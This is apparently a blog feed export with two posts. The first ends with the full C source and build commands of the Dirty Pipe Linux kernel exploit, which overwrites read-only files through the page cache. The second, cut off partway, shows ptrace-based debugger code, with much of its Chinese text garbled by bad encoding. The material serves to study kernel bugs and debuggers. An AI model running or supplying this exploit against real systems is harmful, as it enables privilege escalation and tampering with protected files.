class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> PAGE_SIZE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 4096</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span></span><br><span class=\"line\"><span class=\"comment\"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">prepare_pipe</span><span class=\"params\">(<span class=\"type\">int</span> p[<span class=\"number\">2</span>])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pipe(p)) <span class=\"built_in\">abort</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">unsigned</span> pipe_size = fcntl(p[<span class=\"number\">1</span>], F_GETPIPE_SZ);</span><br><span class=\"line\">\t<span class=\"type\">static</span> <span class=\"type\">char</span> buffer[<span class=\"number\">4096</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class=\"line\"><span class=\"comment\">\t   the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">unsigned</span> r = pipe_size; r &gt; <span class=\"number\">0</span>;) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> n = r &gt; <span class=\"keyword\">sizeof</span>(buffer) ? <span class=\"keyword\">sizeof</span>(buffer) : r;</span><br><span class=\"line\">\t\twrite(p[<span class=\"number\">1</span>], buffer, n);</span><br><span class=\"line\">\t\tr -= n;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class=\"line\"><span class=\"comment\">\t   leaving the flags initialized) */</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">unsigned</span> r = pipe_size; r &gt; <span class=\"number\">0</span>;) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> n = r &gt; <span class=\"keyword\">sizeof</span>(buffer) ? <span class=\"keyword\">sizeof</span>(buffer) : r;</span><br><span class=\"line\">\t\tread(p[<span class=\"number\">0</span>], buffer, n);</span><br><span class=\"line\">\t\tr -= n;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class=\"line\"><span class=\"comment\">\t   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span></span><br><span class=\"line\"><span class=\"comment\">\t   will be mergeable */</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (argc != <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Usage: %s TARGETFILE OFFSET DATA\\n&quot;</span>, argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* dumb command-line argument parser */</span></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">char</span> *<span class=\"type\">const</span> path = argv[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"type\">loff_t</span> offset = strtoul(argv[<span class=\"number\">2</span>], <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">char</span> *<span class=\"type\">const</span> data = argv[<span class=\"number\">3</span>];</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">size_t</span> data_size = <span class=\"built_in\">strlen</span>(data);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (offset % PAGE_SIZE == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Sorry, cannot start writing at a page boundary\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class=\"number\">1</span>)) + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">loff_t</span> end_offset = offset + (<span class=\"type\">loff_t</span>)data_size;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (end_offset &gt; next_page) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Sorry, cannot write across a page boundary\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* open the input file and validate the specified offset */</span></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">int</span> fd = open(path, O_RDONLY); <span class=\"comment\">// yes, read-only! :-)</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (fd &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;open failed&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">st</span>;</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;stat failed&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (offset &gt; st.st_size) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Offset is not inside the file\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Sorry, cannot enlarge the file\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* create the pipe with all flags initialized with</span></span><br><span class=\"line\"><span class=\"comment\">\t   PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> p[<span class=\"number\">2</span>];</span><br><span class=\"line\">\tprepare_pipe(p);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* splice one byte from before the specified offset into the</span></span><br><span class=\"line\"><span class=\"comment\">\t   pipe; this will add a reference to the page cache, but</span></span><br><span class=\"line\"><span class=\"comment\">\t   since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class=\"line\"><span class=\"comment\">\t   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class=\"line\">\t--offset;</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class=\"number\">1</span>], <span class=\"literal\">NULL</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (nbytes &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;splice failed&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (nbytes == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;short splice\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* the following write will not create a new pipe_buffer, but</span></span><br><span class=\"line\"><span class=\"comment\">\t   will instead write into the page cache, because of the</span></span><br><span class=\"line\"><span class=\"comment\">\t   PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class=\"line\">\tnbytes = write(p[<span class=\"number\">1</span>], data, data_size);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (nbytes &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;write failed&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((<span class=\"type\">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;short write\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;It worked!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> EXIT_SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc exp.c -o exp --static</span><br><span class=\"line\">./exp file offset string</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Kernel"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/10/30/debugger-impl/",
            "url": "https://squirre17.github.io/2022/10/30/debugger-impl/",
            "title": "debugger-impl",
            "date_published": "2022-10-30T06:46:09.000Z",
            "content_html": "<p><a href=\"https://eli.thegreenplace.net/2011/01/23/how-debuggers-work-part-1/\">How debuggers work: Part 1 - Basics - Eli Benderskyâ€™s website</a><br>\n å•çº¯çš„å¤ç°æ­¤æ–‡ç« ã€‚</p>\n<h1 id=\"single-step\"><a class=\"markdownIt-Anchor\" href=\"#single-step\">#</a> single step</h1>\n<p>é¦–å…ˆæ˜¯ ptrace</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">long</span> <span class=\"title function_\">ptrace</span><span class=\"params\">(<span class=\"keyword\">enum</span> __ptrace_request request, <span class=\"type\">pid_t</span> pid,</span></span><br><span class=\"line\"><span class=\"params\">                 <span class=\"type\">void</span> *addr, <span class=\"type\">void</span> *data)</span>;</span><br></pre></td></tr></table></figure>\n<p>å¯¹äºç¬¬ä¸€ä¸ª request çš„å‚æ•°</p>\n<ul>\n<li><code>PTRACE_TRACEME</code> Â request, which means that this child process asks the OS kernel to let its parent trace it.</li>\n<li>è¿™ä¸ªå‚æ•°åªç”¨äºå­è¿›ç¨‹ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯åœ¨ fork ä¹‹å</li>\n</ul>\n<p>ç¬¬ä¸‰ä¸ªå¯¹åœ°å€è¿›è¡Œå’Œç¬¬å››ä¸ªæ˜¯åœ°å€æ“ä½œç›¸å…³ï¼Œæ ¹æ® request çš„ç±»å‹ï¼Œæ˜¯å¯¹è¿™ä¸ª addr è¿›è¡Œ pokeï¼Œæˆ–è€… peek è¿™ä¸ªæ•°æ®åˆ° data é‡Œï¼ˆæˆ–è€…ç›´æ¥ peek åˆ°è¿”å›å€¼ï¼‰ã€‚</p>\n<blockquote>\n<p>Indicates that this process is to be traced by its parent. Any signal (except SIGKILL) delivered to this process will cause it to stop and its parent to be notified via wait().Â <strong>Also, all subsequent calls to exec() by this process will cause a SIGTRAP to be sent to it, giving the parent a chance to gain control before the new program begins execution</strong>. A process probably shouldnâ€™t make this request if its parent isnâ€™t expecting to trace it. (pid, addr, and data are ignored.)</p>\n</blockquote>\n<p>wait () å‡½æ•°ç­‰å¾…å­è¿›ç¨‹ç»ˆæ­¢ï¼Œå¹¶è®¾ç½®ç›¸åº”çš„çŠ¶æ€ç ã€‚ï¼ˆä¸è¿‡è¿™é‡Œè²Œä¼¼ä¸æ˜¯ç»ˆæ­¢ï¼Œè€Œæ˜¯ STOPï¼‰æ„Ÿè§‰æ˜¯è‹±æ–‡çš„ terminate åŒ…æ‹¬ stopã€<br>\nWIFSTOPPED (sstatus) åˆ¤è¯»æ˜¯ä¸æ˜¯è¢«ä¿¡å·ä¼ é€’è€Œåœæ­¢</p>\n<blockquote>\n<pre><code>   WIFSTOPPED(wstatus)\n</code></pre>\n</blockquote>\n<pre><code>          returns true if the child process was stopped by delivery of a signal; this is possible only if the call was done using WUNTRACED or\n          when the child is being traced (see ptrace(2)).\n</code></pre>\n<p>å­è¿›ç¨‹åˆ©ç”¨ <code>(ptrace(PTRACE_TRACEME, 0, 0, 0)</code>  å‘ OS å‘é€è¯·æ±‚è¦æ±‚çˆ¶è¿›ç¨‹ watch è‡ªå·±ï¼Œç„¶å execl çš„æ—¶å€™å‘é€ SIGTRAP ç»™çˆ¶è¿›ç¨‹ã€‚<br>\nç„¶åçˆ¶è¿›ç¨‹é‡Œå°±ä¸æ–­å‘é€å•æ­¥ä¿¡å·å’Œ wait ç­‰å¾…ã€‚<br>\nçˆ¶è¿›ç¨‹ä¸­å¾ªç¯ç»“æŸçš„æ¡ä»¶æ˜¯å­è¿›ç¨‹å‘é€ exit çš„ä¿¡å·ï¼ŒWIFEXITEDã€‚</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdio.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdlib.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;unistd.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;sys/types.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ptrace.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> procmsg(s...) printf(s)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TODO do &#123;\\</span></span><br><span class=\"line\"><span class=\"meta\">    printf(<span class=\"string\">&quot;TODO: %s\\n&quot;</span>, __FUNCTION__); \\</span></span><br><span class=\"line\"><span class=\"meta\">    exit(1); \\</span></span><br><span class=\"line\"><span class=\"meta\">&#125; while (0);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">run_target</span><span class=\"params\">(<span class=\"type\">char</span> * programname)</span>&#123;</span><br><span class=\"line\">    procmsg(<span class=\"string\">&quot;target started. will run &#x27;%s&#x27;\\n&quot;</span>, programname);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Allow tracing of this process */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ptrace(PTRACE_TRACEME, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;ptrace&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Replace this process&#x27;s image with the given program */</span></span><br><span class=\"line\">    execl(programname, programname, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">run_debugger</span><span class=\"params\">(<span class=\"type\">pid_t</span> child_pid)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> wait_status;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> icounter = <span class=\"number\">0</span>;</span><br><span class=\"line\">    procmsg(<span class=\"string\">&quot;debugger started\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Wait for child to stop on its first instruction after execl */</span></span><br><span class=\"line\">    wait(&amp;wait_status);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (WIFSTOPPED(wait_status)) &#123;</span><br><span class=\"line\">        icounter++;</span><br><span class=\"line\">        <span class=\"comment\">/* Make the child execute another instruction */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ptrace(PTRACE_SINGLESTEP, child_pid, <span class=\"number\">0</span>, <span class=\"number\">0</span>) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            perror(<span class=\"string\">&quot;ptrace&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Wait for child to stop on its next instruction */</span></span><br><span class=\"line\">        wait(&amp;wait_status);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    procmsg(<span class=\"string\">&quot;the child executed %u instructions\\n&quot;</span>, icounter);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">pid_t</span> pid;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Expected a program name as argument\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    pid = fork();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pid == <span class=\"number\">0</span>)     <span class=\"comment\">/* child process */</span></span><br><span class=\"line\">        run_target(argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pid &gt; <span class=\"number\">0</span>) <span class=\"comment\">/* parent process */</span></span><br><span class=\"line\">        run_debugger(pid);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;fork&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å¯¹äºå®ƒç›‘å¬çš„ victim</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.intel_syntax noprefix</span><br><span class=\"line\">.section .text</span><br><span class=\"line\">.global _start</span><br><span class=\"line\"></span><br><span class=\"line\">_start:</span><br><span class=\"line\">    mov rdi, <span class=\"number\">1</span></span><br><span class=\"line\">    lea rsi, .msg[rip]</span><br><span class=\"line\">    mov rdx, <span class=\"number\">20</span></span><br><span class=\"line\">    mov rax, <span class=\"number\">1</span>    <span class=\"comment\">// sys_write callno</span></span><br><span class=\"line\">    syscall      </span><br><span class=\"line\"></span><br><span class=\"line\">    mov rax, <span class=\"number\">60</span></span><br><span class=\"line\">    syscall</span><br><span class=\"line\"></span><br><span class=\"line\">.section .data</span><br><span class=\"line\">.msg:</span><br><span class=\"line\">    .<span class=\"built_in\">string</span> <span class=\"string\">&quot;hello debugger\\n\\0&quot;</span> </span><br><span class=\"line\"><span class=\"comment\">// as -o victim.o -s victim.S</span></span><br><span class=\"line\"><span class=\"comment\">// ld -o victim victim.o</span></span><br></pre></td></tr></table></figure>\n<p>ç„¶åå¼•å…¥ä¸€ä¸ª <code>sys/user.h</code>  çš„ header ç”¨äºè°ƒè¯•ã€‚</p>\n<blockquote>\n<p>/* The whole purpose of this file is for GDB and GDB only.<br>\nDonâ€™t read too much into it. Donâ€™t use it for<br>\nanything other than GDB unless know what you are<br>\ndoing.  */</p>\n</blockquote>\n<p>ç”¨ <code>PTRACE_PEEKTEXT</code>  è¿›è¡ŒæŒ‡å®šåœ°å€çš„å†…å­˜è·å–</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">run_debugger</span><span class=\"params\">(<span class=\"type\">pid_t</span> child_pid)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> wait_status;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> icounter = <span class=\"number\">0</span>;</span><br><span class=\"line\">    pntmsg(<span class=\"string\">&quot;debugger started\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Wait for child to stop on its first instruction after execl */</span></span><br><span class=\"line\">    wait(&amp;wait_status);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (WIFSTOPPED(wait_status)) &#123;</span><br><span class=\"line\">        icounter++;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_regs_struct</span> <span class=\"title\">regs</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        ptrace(PTRACE_GETREGS, child_pid, <span class=\"number\">0</span>, &amp;regs);</span><br><span class=\"line\">        <span class=\"type\">unsigned</span> instr = ptrace(PTRACE_PEEKTEXT, child_pid, regs.rip, <span class=\"number\">0</span>);</span><br><span class=\"line\">        pntmsg(<span class=\"string\">&quot;icounter = %u, instr = 0x%08x, rip = 0x%08x, rax = 0x%08x\\n&quot;</span>,</span><br><span class=\"line\">            icounter, instr, regs.rip, regs.rax</span><br><span class=\"line\">        );</span><br><span class=\"line\">        <span class=\"comment\">/* Make the child execute another instruction */</span></span><br><span class=\"line\">        Ptrace(PTRACE_SINGLESTEP, child_pid, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Wait for child to stop on its next instruction */</span></span><br><span class=\"line\">        wait(&amp;wait_status);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    pntmsg(<span class=\"string\">&quot;the child executed %u instructions\\n&quot;</span>, icounter);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ä¸€æ¬¡è¿”å›å€¼æ˜¯ 4 å­—èŠ‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[PNT] debugger started</span><br><span class=\"line\">[CHD] target started. will run &#x27;./victim&#x27;</span><br><span class=\"line\">[PNT] icounter = 1, instr = 0x01c7c748, rip = 0x00401000, rax = 0x00000000</span><br><span class=\"line\">[PNT] icounter = 2, instr = 0xf2358d48, rip = 0x00401007, rax = 0x00000000</span><br><span class=\"line\">[PNT] icounter = 3, instr = 0x14c2c748, rip = 0x0040100e, rax = 0x00000000</span><br><span class=\"line\">[PNT] icounter = 4, instr = 0x01c0c748, rip = 0x00401015, rax = 0x00000000</span><br><span class=\"line\">[PNT] icounter = 5, instr = 0xc748050f, rip = 0x0040101c, rax = 0x00000001</span><br><span class=\"line\">hello debugger</span><br><span class=\"line\">[PNT] icounter = 6, instr = 0x3cc0c748, rip = 0x0040101e, rax = 0x00000014</span><br><span class=\"line\">[PNT] icounter = 7, instr = 0x0000050f, rip = 0x00401025, rax = 0x0000003c</span><br><span class=\"line\">[PNT] the child executed 7 instructions</span><br></pre></td></tr></table></figure>\n<h1 id=\"breakpoint\"><a class=\"markdownIt-Anchor\" href=\"#breakpoint\">#</a> breakpoint</h1>\n<p>ä¸­æ–­åˆ†ä¸ºè½¯ä¸­æ–­å’Œç¡¬ä¸­æ–­.<br>\n ç¡¬ä¸­æ–­æœ‰ä¸“é—¨çš„ç”µå™¨è®¾å¤‡å»å¤„ç†ã€‚<br>\nå¯¹äºä¸€æ¡æŒ‡ä»¤ï¼Œdebugger ä¼šæŠŠå®ƒçš„é¦–æŒ‡ä»¤æ›¿æ¢ä¸º <code>int 3</code> (0xcc).</p>\n<p>objdump å‡ºæŒ‡ä»¤</p>\n<figure class=\"highlight shell\"><table><tr><td 